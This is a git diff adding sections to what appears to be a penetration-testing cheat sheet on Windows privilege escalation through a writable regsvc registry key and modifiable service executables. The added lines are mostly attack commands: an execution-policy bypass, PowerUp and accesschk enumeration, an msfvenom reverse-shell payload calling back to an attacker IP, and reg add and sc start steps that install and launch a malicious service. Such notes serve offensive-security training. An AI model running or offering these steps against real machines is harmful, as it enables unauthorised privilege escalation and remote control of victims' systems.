@@ -257,8 +257,54 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport=[attacker 
 Write-UserAddMSI
 ```
 ### via regsvc
+> Allows us to create a service directly in the registy pointing to our own malicious executable, and then start that service.  
 
+#### Enumeration
+- via Powershell
+```shell
+# Set execution policy
+powershell -ep bypass
+
+# Get-ACL
+Get-ACL -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+# Under Access, Look for "NT AUTHORITY\INTERACTIVE Allow FullControl
+```
+#### Exploitation
+- Generate a payload.
+```bash
+# Example Reverse shell from msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o reverse.exe
+```
+- Upload the payload to a suitable directory (C:\Windows\Temp\)
+- Add the registry entry for our malicious service.
+```bash
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <path malicious executable> /f
+```
+- Start our malicious service
+```bash
+sc start regsvc
+```
 ## Executables
+### Enumeration
+- via PowerUp.ps1
+```shell
+# Execution policy bypass
+powershell -ep bypass
+
+# Run PowerUp.ps1
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+> Verify in the `Checking service executable and argument permissions...` section that a service has `ModifiableFile`, `ModifiableFilePermissions`, and `ModifiableFileIdentityReference` permissions.  
+
+- via [accesschk64.exe]()
+> accesschk64 doesn't run a scan so you have to already know the service your investigating.  
+```shell
+accesschk64.exe -wvu <path to executable>
+```
+### Exploitation
+> Basically we are going to save our malicious executable over the service executable, and then start the service.
 
 ## Startup Applications
 
